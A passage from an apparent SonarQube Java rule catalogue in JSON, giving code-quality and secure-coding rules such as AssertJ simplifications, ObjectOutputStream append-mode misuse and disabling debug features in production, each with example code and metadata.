<td><code>assertThat(getPath()).endsWithRaw(path)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getPath().getParent()).isEqualTo(name)</code></td>\n      <td><code>assertThat(getPath()).hasParentRaw(name)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getPath().getParent()).isNull()</code></td>\n      <td><code>assertThat(getPath()).hasNoParentRaw()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getPath().isAbsolute()).isTrue()</code></td>\n      <td><code>assertThat(getPath()).isAbsolute()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getPath().isAbsolute()).isFalse()</code></td>\n      <td><code>assertThat(getPath()).isRelative()</code></td>\n    </tr>\n    <tr>\n      <th>&nbsp;Related to <code>Array</code></th>\n      <th>&nbsp;</th>\n    </tr>\n    <tr>\n      <td><code>assertThat(getArray().length).isZero()</code></td>\n      <td><code>assertThat(getArray()).isEmpty()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getArray().length).isEqualTo(length)</code></td>\n      <td><code>assertThat(getArray()).hasSize(length)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getArray().length).isEqualTo(anotherArray.length)</code></td>\n      <td><code>assertThat(getArray()).hasSameSizeAs(getAnotherArray())</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getArray().length).isLessThanOrEqualTo(expression)</code></td>\n      <td><code>assertThat(getArray()).hasSizeLessThanOrEqualTo(expression)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getArray().length).isLessThan(expression)</code></td>\n      <td><code>assertThat(getArray()).hasSizeLessThan(expression)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getArray().length).isGreaterThan(expression)</code></td>\n      <td><code>assertThat(getArray()).hasSizeGreaterThan(expression)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getArray().length).isGreaterThanOrEqualTo(expression)</code></td>\n      <td><code>assertThat(getArray()).hasSizeGreaterThanOrEqualTo(expression)</code></td>\n    </tr>\n    <tr>\n      <th>&nbsp;Related to <code>Collection</code></th>\n      <th>&nbsp;</th>\n    </tr>\n    <tr>\n      <td><code>assertThat(getCollection().isEmpty()).isTrue()</code></td>\n      <td><code>assertThat(getCollection()).isEmpty()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getCollection().size()).isZero()</code></td>\n      <td><code>assertThat(getCollection()).isEmpty()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getCollection().contains(something)).isTrue()</code></td>\n      <td><code>assertThat(getCollection()).contains(something)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getCollection().containsAll(otherCollection)).isTrue()</code></td>\n      <td><code>assertThat(getCollection()).containsAll(otherCollection)</code></td>\n    </tr>\n    <tr>\n      <th>&nbsp;Related to <code>Map</code></th>\n      <th>&nbsp;</th>\n    </tr>\n    <tr>\n      <td><code>assertThat(getMap().size()).isEqualTo(otherMap().size()</code></td>\n      <td><code>assertThat(getMap()).hasSameSizeAs(otherMap())</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getMap().containsKey(key)).isTrue()</code></td>\n      <td><code>assertThat(getMap()).containsKey(key)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getMap().keySet()).contains(key)</code></td>\n      <td><code>assertThat(getMap()).containsKey(key)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getMap().keySet()).containsOnlyKey(key)</code></td>\n      <td><code>assertThat(getMap()).containsOnlyKey(key)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getMap().containsValue(value)).isTrue()</code></td>\n      <td><code>assertThat(getMap()).containsValue(value)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getMap().values()).contains(value)</code></td>\n      <td><code>assertThat(getMap()).containsValue(</code><code>value</code><code>)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getMap().get(key)).isEqualTo(value)</code></td>\n      <td><code>assertThat(getMap()).containsEntry(key, value)</code></td>\n    </tr>\n    <tr>\n      <th>Related to <code>Optional</code></th>\n      <th>&nbsp;</th>\n    </tr>\n    <tr>\n      <td><code>assertThat(getOptional().isPresent()).isTrue()</code></td>\n      <td><code>assertThat(getOptional()).isPresent()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getOptional().get()).isEqualTo(something)</code></td>\n      <td><code>assertThat(getOptional()).contains(something)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getOptional().get()).isSameAs(something)</code></td>\n      <td><code>assertThat(getOptional()).containsSame(something)</code></td>\n    </tr>\n  </tbody>\n</table>\n<h2>Noncompliant Code Example</h2>\n<pre>\nassertThat(getObject()).isEqualTo(null); // Noncompliant\nassertThat(getObject()).isNotEqualTo(null); // Noncompliant - not listed above but also supported\n\nassertThat(getString().trim()).isEmpty();\nassertThat(getFile().canRead()).isTrue();\nassertThat(getPath().getParent()).isNull();\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nassertThat(getObject()).isNull();\n\nassertThat(getString()).isBlank();\nassertThat(getFile()).canRead();\nassertThat(getPath()).hasNoParentRaw();\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "assertj",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2689",
            "repo": "java",
            "name": "Files opened in append mode should not be used with ObjectOutputStream",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>ObjectOutputStream</code>s are used with serialization, and the first thing an <code>ObjectOutputStream</code> writes is the serialization\nstream header. This header should appear once per file, at the beginning. Pass a file opened in append mode into an <code>ObjectOutputStream</code>\nconstructor and the serialization stream header will be added to the end of the file before your object is then also appended.</p>\n<p>When you're trying to read your object(s) back from the file, only the first one will be read successfully, and a\n<code>StreamCorruptedException</code> will be thrown after that.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nFileOutputStream fos = new FileOutputStream (fileName , true);  // fos opened in append mode\nObjectOutputStream out = new ObjectOutputStream(fos);  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nFileOutputStream fos = new FileOutputStream (fileName);\nObjectOutputStream out = new ObjectOutputStream(fos);\n</pre>",
            "mdDesc": "<p><code>ObjectOutputStream</code>s are used with serialization, and the first thing an <code>ObjectOutputStream</code> writes is the serialization\nstream header. This header should appear once per file, at the beginning. Pass a file opened in append mode into an <code>ObjectOutputStream</code>\nconstructor and the serialization stream header will be added to the end of the file before your object is then also appended.</p>\n<p>When you're trying to read your object(s) back from the file, only the first one will be read successfully, and a\n<code>StreamCorruptedException</code> will be thrown after that.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nFileOutputStream fos = new FileOutputStream (fileName , true);  // fos opened in append mode\nObjectOutputStream out = new ObjectOutputStream(fos);  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nFileOutputStream fos = new FileOutputStream (fileName);\nObjectOutputStream out = new ObjectOutputStream(fos);\n</pre>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "serialization"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1h",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1h",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1h",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1h",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1117",
            "repo": "java",
            "name": "Local variables should not shadow class fields",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Overriding or shadowing a variable declared in an outer scope can strongly impact the readability, and therefore the maintainability, of a piece of\ncode. Further, it could lead maintainers to introduce bugs because they think they're using one variable but are really using another.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Foo {\n  public int myField;\n\n  public void doSomething() {\n    int myField = 0;\n    ...\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/c/DCL01-C.+Do+not+reuse+variable+names+in+subscopes\">CERT, DCL01-C.</a> - Do not reuse\n  variable names in subscopes </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/DCL51-J.+Do+not+shadow+or+obscure+identifiers+in+subscopes\">CERT, DCL51-J.</a> - Do\n  not shadow or obscure identifiers in subscopes </li>\n</ul>",
            "mdDesc": "<p>Overriding or shadowing a variable declared in an outer scope can strongly impact the readability, and therefore the maintainability, of a piece of\ncode. Further, it could lead maintainers to introduce bugs because they think they're using one variable but are really using another.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Foo {\n  public int myField;\n\n  public void doSomething() {\n    int myField = 0;\n    ...\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/c/DCL01-C.+Do+not+reuse+variable+names+in+subscopes\">CERT, DCL01-C.</a> - Do not reuse\n  variable names in subscopes </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/DCL51-J.+Do+not+shadow+or+obscure+identifiers+in+subscopes\">CERT, DCL51-J.</a> - Do\n  not shadow or obscure identifiers in subscopes </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "pitfall",
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4507",
            "repo": "java",
            "name": "Delivering code in production with debug features activated is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Delivering code in production with debug features activated is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1999007\">CVE-2018-1999007</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5306\">CVE-2015-5306</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2006\">CVE-2013-2006</a> </li>\n</ul>\n<p>An application's debug features enable developers to find bugs more easily and thus facilitate also the work of attackers. It often gives access to\ndetailed information on both the system running the application and users. </p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the code or configuration enabling the application debug features is deployed on production servers. </li>\n  <li> the application runs by default with debug features activated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Do not enable debug features on production servers.</p>\n<h2>Sensitive Code Example</h2>\n<p><code>Throwable.printStackTrace(...)</code> prints a Throwable and its stack trace to <code>System.Err</code> (by default) which is not easily\nparseable and can expose sensitive information:</p>\n<pre>\ntry {\n  /* ... */\n} catch(Exception e) {\n  e.printStackTrace();        // Sensitive\n}\n</pre>\n<p><a\nhref=\"https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/config/annotation/web/configuration/EnableWebSecurity.html\">EnableWebSecurity</a>\nannotation for SpringFramework with <code>debug</code> to <code>true</code> enable debugging support:</p>\n<pre>\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\n\n@Configuration\n@EnableWebSecurity(debug = true) // Sensitive\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Loggers should be used (instead of <code>printStackTrace</code>) to print throwables:</p>\n<pre>\ntry {\n  /* ... */\n} catch(Exception e) {\n  LOGGER.log(\"context\", e); // Compliant\n}\n</pre>\n<p><a\nhref=\"https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/config/annotation/web/configuration/EnableWebSecurity.html\">EnableWebSecurity</a>\nannotation for SpringFramework with <code>debug</code> to <code>false</code> disable debugging support:</p>\n<pre>\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\n\n@Configuration\n@EnableWebSecurity(debug = false) // Compliant\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n  // ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/489.html\">MITRE, CWE-489</a> - Leftover Debug Code </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/215.html\">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>\n</ul>",
            "mdDesc": "<p>Delivering code in production with debug features activated is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1999007\">CVE-2018-1999007</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5306\">CVE-2015-5306</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2006\">CVE-2013-2006</a> </li>\n</ul>\n<p>An application's debug features enable developers to find bugs more easily and thus facilitate also the work of attackers. It often gives access to\ndetailed information on both the system running the application and users. </p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the code or configuration enabling the application debug features is deployed on production servers. </li>\n  <li> the application runs by default with debug features activated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Do not enable debug features on production servers.</p>\n<h2>Sensitive Code Example</h2>\n<p><code>Throwable.printStackTrace(...)</code> prints a Throwable and its stack trace to <code>System.Err</code> (by default) which is not easily\nparseable and can expose sensitive information:</p>\n<pre>\ntry {\n  /* ... */\n} catch(Exception e) {\n  e.printStackTrace();        // Sensitive\n}\n</pre>\n<p><a\nhref=\"https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/config/annotation/web/configuration/EnableWebSecurity.html\">EnableWebSecurity</a>\nannotation for SpringFramework with <code>debug</code> to <code>true</code> enable debugging support:</p>\n<pre>\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\n\n@Configuration\n@EnableWebSecurity(debug = true) // Sensitive\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Loggers should be used (instead of <code>printStackTrace</code>) to print throwables:</p>\n<pre>\ntry {\n  /* ... */\n} catch(Exception e) {\n  LOGGER.log(\"context\", e); // Compliant\n}\n</pre>\n<p><a\nhref=\"https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/config/annotation/web/configuration/EnableWebSecurity.html\">EnableWebSecurity</a>\nannotation for SpringFramework with <code>debug</code> to <code>false</code> disable debugging support:</p>\n<pre>\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\n\n@Configuration\n@EnableWebSecurity(debug = false) // Compliant\npublic class WebSecurityConfig extends WebSecurityConfigurerAdapter {\n  // ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/489.html\">MITRE, CWE-489</a> - Leftover Debug Code </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/215.html\">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "debug",
                "error-handling",
                "owasp-a3",
                "spring",
                "user-experience"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S2447",
            "repo": "java",
            "name": "Null should not be returned from a \"Boolean\" method",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>While <code>null</code> is technically a valid <code>Boolean</code> value, that fact, and the distinction between <code>Boolean</code> and\n<code>boolean</code> is easy to forget. So returning <code>null</code> from a <code>Boolean</code> method is likely to cause problems with callers'\ncode.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic Boolean isUsable() {\n  // ...\n  return null;  // Noncompliant\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/476.html\">MITRE CWE-476</a> - NULL Pointer Dereference </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/aDdGBQ\">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required </li>\n</ul>",
            "mdDesc": "<p>While <code>null</code> is technically a valid <code>Boolean</code> value, that fact, and the distinction between <code>Boolean</code> and\n<code>boolean</code> is easy to forget. So returning <code>null</code> from a <code>Boolean</code> method is likely to cause problems with callers'\ncode.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic Boolean isUsable() {\n  // ...\n  return null;  // Noncompliant\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/476.html\">MITRE CWE-476</a> - NULL Pointer Dereference </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/aDdGBQ\">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5958",
            "repo": "java",
            "name": "AssertJ \"assertThatThrownBy\" should not be used alone",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Unlike similar AssertJ methods testing exceptions (<code>assertThatCode()</code>, <code>assertThatExceptionOfType()</code>, ...), the\n<code>assertThatThrownBy()</code> method can be used alone, failing if the code did not raise any exception.</p>\n<p>Still, only testing that an exception was raised is not enough to guarantee that it was the expected one, and you should test the exception type or\ncontent further. In addition, it will make explicit what you are expecting, without relying on side-effects.</p>\n<p>This rule raises an issue when <code>assertThatThrownBy</code> is used, without testing the exception further.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nassertThatThrownBy(() -&gt; shouldThrow()); // Noncompliant, is it really the exception you expected?\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nassertThatThrownBy(() -&gt; shouldThrow()).isInstanceOf(IOException.class);\n//or\nassertThatThrownBy(() -&gt; shouldThrow()).hasMessage(\"My exception\");\n</pre>",
            "mdDesc": "<p>Unlike similar AssertJ methods testing exceptions (<code>assertThatCode()</code>, <code>assertThatExceptionOfType()</code>, ...), the\n<code>assertThatThrownBy()</code> method can be used alone, failing if the code did not raise any exception.</p>\n<p>Still, only testing that an exception was raised is not enough to guarantee that it was the expected one, and you should test the exception type or\ncontent further. In addition, it will make explicit what you are expecting, without relying on side-effects.</p>\n<p>This rule raises an issue when <code>assertThatThrownBy</code> is used, without testing the exception further.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nassertThatThrownBy(() -&gt; shouldThrow()); // Noncompliant, is it really the exception you expected?\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nassertThatThrownBy(() -&gt; shouldThrow()).isInstanceOf(IOException.class);\n//or\nassertThatThrownBy(() -&gt; shouldThrow()).hasMessage(\"My exception\");\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "assertj",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1479",
            "repo": "java",
            "name": "\"switch\" statements should not have too many \"case\" clauses",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When <code>switch</code> statements have large sets of <code>case</code> clauses, it is usually an attempt to map two sets of data. A real map\nstructure would be more readable and maintainable, and should be used instead.</p>\n<h2>Exceptions</h2>\n<p>This rule ignores <code>switch</code>es over <code>Enum</code>s and empty, fall-through cases.</p>",
            "mdDesc": "<p>When <code>switch</code> statements have large sets of <code>case</code> clauses, it is usually an attempt to map two sets of data. A real map\nstructure would be more readable and maintainable, and should be used instead.</p>\n<h2>Exceptions</h2>\n<p>This rule ignores <code>switch</code>es over <code>Enum</code>s and empty, fall-through cases.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "brain-overload"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "maximum",
                    "htmlDesc": "Maximum number of case",
                    "defaultValue": "30",
                    "type": "INTEGER"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3658",
            "repo": "java",
            "name": "Unit tests should throw exceptions",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When the code under test in a unit test throws an exception, the test itself fails. Therefore, there is no need to surround the tested code with a\n<code>try</code>-<code>catch</code> structure to detect failure. Instead, you can simply move the exception type to the method signature. </p>\n<p>This rule raises an issue when there is a fail assertion inside a <code>catch</code> block.</p>\n<p>Supported frameworks:</p>\n<ul>\n  <li> JUnit3 </li>\n  <li> JUnit4 </li>\n  <li> JUnit5 </li>\n  <li> Fest assert </li>\n  <li> AssertJ </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\npublic void testMethod() {\n  try {\n            // Some code\n  } catch (MyException e) {\n    Assert.fail(e.getMessage());  // Noncompliant\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Test\npublic void testMethod() throws MyException {\n    // Some code\n}\n</pre>",
            "mdDesc": "<p>When the code under test in a unit test throws an exception, the test itself fails. Therefore, there is no need to surround the tested code with a\n<code>try</code>-<code>catch</code> structure to detect failure. Instead, you can simply move the exception type to the method signature. </p>\n<p>This rule raises an issue when there is a fail assertion inside a <code>catch</code> block.</p>\n<p>Supported frameworks:</p>\n<ul>\n  <li> JUnit3 </li>\n  <li> JUnit4 </li>\n  <li> JUnit5 </li>\n  <li> Fest assert </li>\n  <li> AssertJ </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\npublic void testMethod() {\n  try {\n            // Some code\n  } catch (MyException e) {\n    Assert.fail(e.getMessage());  // Noncompliant\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Test\npublic void testMethod() throws MyException {\n    // Some code\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy",
                "error-handling",
                "junit",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1116",
            "repo": "java",
            "name": "Empty statements should be removed",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Empty statements, i.e. <code>;</code>, are usually introduced by mistake, for example because:</p>\n<ul>\n  <li> It was meant to be replaced by an actual statement, but this was forgotten. </li>\n  <li> There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid doSomething() {\n  ;                                                       // Noncompliant - was used as a kind of TODO marker\n}\n\nvoid doSomethingElse() {\n  System.out.println(\"Hello, world!\");;                     // Noncompliant - double ;\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvoid doSomething() {}\n\nvoid doSomethingElse() {\n  System.out.println(\"Hello, world!\");\n  ...\n  for (int i = 0; i &lt; 3; i++) ; // compliant if unique statement of a loop\n  ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/IDZGBQ\">CERT, MSC51-J.</a> - Do not place a semicolon immediately following an if, for, or while\n  condition </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/WtYxBQ\">CERT, EXP15-C.</a> - Do not place a semicolon on the same line as an if, for, or while\n  statement </li>\n</ul>",
            "mdDesc": "<p>Empty statements, i.e. <code>;</code>, are usually introduced by mistake, for example because:</p>\n<ul>\n  <li> It was meant to be replaced by an actual statement, but this was forgotten. </li>\n  <li> There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>. </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nvoid doSomething() {\n  ;                                                       // Noncompliant - was used as a kind of TODO marker\n}\n\nvoid doSomethingElse() {\n  System.out.println(\"Hello, world!\");;                     // Noncompliant - double ;\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvoid doSomething() {}\n\nvoid doSomethingElse() {\n  System.out.println(\"Hello, world!\");\n  ...\n  for (int i = 0; i &lt; 3; i++) ; // compliant if unique statement of a loop\n  ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/IDZGBQ\">CERT, MSC51-J.</a> - Do not place a semicolon immediately following an if, for, or while\n  condition </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/WtYxBQ\">CERT, EXP15-C.</a> - Do not place a semicolon on the same line as an if, for, or while\n  statement </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "unused"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2698",
            "repo": "java",
            "name": "Test assertions should include messages",
            "createdAt": "2022-09-26T07:32:37+0000",
